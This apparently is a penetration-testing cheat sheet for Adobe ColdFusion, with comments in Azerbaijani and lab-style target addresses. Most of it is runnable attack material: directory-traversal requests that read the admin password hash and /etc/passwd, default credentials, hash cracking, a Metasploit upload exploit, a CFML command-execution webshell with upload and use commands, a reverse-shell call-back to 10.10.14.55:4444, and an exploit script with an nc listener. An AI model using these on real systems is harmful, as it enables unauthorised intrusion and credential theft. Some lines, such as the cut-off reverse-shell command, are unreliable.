# Discovery & Enumeration
```powershell
# Tam skan
sudo nmap -p- -sC -sV -Pn <TARGET_IP> --open

# ColdFusion portlarına fokus
sudo nmap -p 80,443,8500,1935,5500 -sV <TARGET_IP>

8500/tcp  open  fmtp   ← ColdFusion SSL port
```

# Default Paths
```powershell
http://<TARGET>:8500/CFIDE/
http://<TARGET>:8500/CFIDE/administrator/index.cfm   ← Admin panel
http://<TARGET>:8500/cfdocs/
http://<TARGET>:8500/CFIDE/administrator/enter.cfm
http://<TARGET>:8500/CFIDE/componentutils/cfexplorer.cfm
```

# Version
```powershell
# HTTP header yoxla
curl -I http://<TARGET>:8500/CFIDE/administrator/index.cfm

# Admin login səhifəsinə bax → "ColdFusion X Administrator" başlığı
curl -s http://<TARGET>:8500/CFIDE/administrator/index.cfm | grep -i "coldfusion"
```

# Discovery Enumeration
```powershell
# Gobuster ilə .cfm faylları axtar
gobuster dir -u http://<TARGET>:8500/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x cfm,cfc \
  -t 30

# ffuf ilə
ffuf -u http://<TARGET>:8500/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt \
  -e .cfm,.cfc
```

# Default Credentials
```powershell
admin:admin
admin:(boş)
administrator:administrator
```

# Metasploit
```powershell
searchsploit adobe coldfusion

# Əsas nəticələr:
# Adobe ColdFusion - Directory Traversal        → 14641.py
# Adobe ColdFusion 8 - RCE                      → 50057.py
# Adobe ColdFusion 9 - Auth Bypass              → 27755.txt

# Exploit-i kopyala
searchsploit -p 14641
cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .

searchsploit -p 50057
cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
```

# ColdFusion 8 — Directory Traversal (CVE-2010-2861)
```powershell
/CFIDE/administrator/settings/mappings.cfm
/CFIDE/administrator/logging/settings.cfm
/CFIDE/administrator/datasources/index.cfm
/CFIDE/administrator/j2eepackaging/editarchive.cfm
/CFIDE/administrator/enter.cfm
/CFIDE/wizards/common/_logintowizard.cfm
/CFIDE/wizards/common/_authenticatewizarduser.cfm

# Admin şifrə hash-ini oxu
curl "http://<TARGET>:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en"

# Windows path
curl "http://<TARGET>:8500/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en"

# İstifadə
python2 14641.py <HOST> <PORT> <FILE_PATH>

# Nümunə - Windows
python2 14641.py 10.129.204.230 8500 \
  "../../../../../../../../ColdFusion8/lib/password.properties"

# Nümunə - Linux
python2 14641.py 10.129.204.230 8500 \
  "../../../../../../../../etc/passwd"

hashcat -m 100 <HASH> /usr/share/wordlists/rockyou.txt
```

# ColdFusion 8 — File Upload → RCE (CVE-2009-2265)
```powershell
/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm
  ?Command=FileUpload&Type=File&CurrentFolder=

# Metasploit ilə
msfconsole
use exploit/windows/http/coldfusion_fckeditor
set RHOSTS <TARGET>
set RPORT 8500
set LHOST <LHOST>
run

# FCKeditor upload endpoint
// Shell.cfm
<cfexecute name="cmd.exe" arguments="/c #url.cmd#" timeout="5" variable="output">
</cfexecute>
<cfoutput>#output#</cfoutput>

curl -F "newfile=@shell.cfm" \
  "http://<TARGET>:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/"
```

# Manual WebShell
```powershell
# CFML webshell faylı yarat (shell.cfm)
cat > shell.cfm << 'EOF'
<cfexecute name="cmd.exe" 
  arguments="/c #url.cmd#" 
  timeout="5" 
  variable="output">
</cfexecute>
<cfoutput>#output#</cfoutput>
EOF

# FCKeditor vasitəsilə upload et
curl -F "newfile=@shell.cfm" \
  "http://<TARGET>:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/"

# Webshell-i istifadə et
curl "http://<TARGET>:8500/userfiles/file/shell.cfm?cmd=whoami"
curl "http://<TARGET>:8500/userfiles/file/shell.cfm?cmd=ipconfig"

curl "http://<TARGET>:8500/userfiles/file/shell.cfm?cmd=powershell+-nop+-c+%22%24client+%3D+New-Object+System.Net.Sockets.TCPClient%28%2710.10.14.55%27%2C4444%29%3B%22"
```

# Manual WebShell Method 2
```powershell
# Skripti kopyala
cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .

# Skript içindəki dəyərləri dəyiş:
lhost = '10.10.15.218'   # sənin VPN IP-n
lport = 4444
rhost = "10.129.31.28"   # hədəf
rport = 8500

# Listener aç (ayrı terminal)
nc -lvnp 4444

# Skripti işlət
python3 50057.py
```
